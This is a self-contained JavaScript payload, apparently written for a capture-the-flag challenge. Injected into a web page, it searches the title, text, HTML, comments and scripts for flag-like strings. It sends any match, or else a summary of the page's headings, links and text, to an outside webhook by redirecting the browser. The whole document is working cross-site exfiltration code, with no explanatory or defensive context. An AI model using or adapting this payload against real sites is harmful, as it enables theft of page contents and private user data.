(() => {
  const WEBHOOK = 'https://webhooksite.net/ae3222ba-a10c-4885-942d-a1e673df5116';

  const patterns = [
    /flag\{[^}]+\}/i,
    /ctf\{[^}]+\}/i,
    /hackcon[a-z_]*\{[^}]+\}/i,
    /hc[a-z_]*\{[^}]+\}/i
  ];

  const redirect = (params) => {
    const u = new URL(WEBHOOK);
    for (const [k, v] of Object.entries(params)) {
      u.searchParams.set(k, v);
    }
    top.location = u.toString();
  };

  const findFlag = (text) => {
    if (!text) return null;
    for (const re of patterns) {
      const m = text.match(re);
      if (m) return m[0];
    }
    return null;
  };

  const sources = [];

  try { sources.push(['title', document.title || '']); } catch {}
  try { sources.push(['body', document.body?.innerText || '']); } catch {}
  try { sources.push(['html', document.documentElement?.outerHTML || '']); } catch {}

  try {
    const walker = document.createTreeWalker(document, NodeFilter.SHOW_COMMENT);
    let node;
    while ((node = walker.nextNode())) {
      sources.push(['comment', node.nodeValue || '']);
    }
  } catch {}

  try {
    [...document.scripts].forEach((s, i) => {
      sources.push([`script_${i}`, s.textContent || '']);
    });
  } catch {}

  try {
    for (const [label, text] of sources) {
      const hit = findFlag(text);
      if (hit) {
        redirect({ type: 'flag', where: label, value: hit });
        return;
      }
    }
  } catch {}

  const hints = [];
  try { hints.push('title=' + (document.title || '')); } catch {}
  try { hints.push('h1=' + ([...document.querySelectorAll('h1,h2,h3')].map(x => x.innerText).join(' | ').slice(0, 300))); } catch {}
  try { hints.push('links=' + [...document.links].map(a => a.href).slice(0, 10).join(',')); } catch {}
  try { hints.push('text=' + (document.body?.innerText || '').slice(0, 500)); } catch {}

  redirect({
    type: 'noflag',
    info: hints.join('\n')
  });
})();
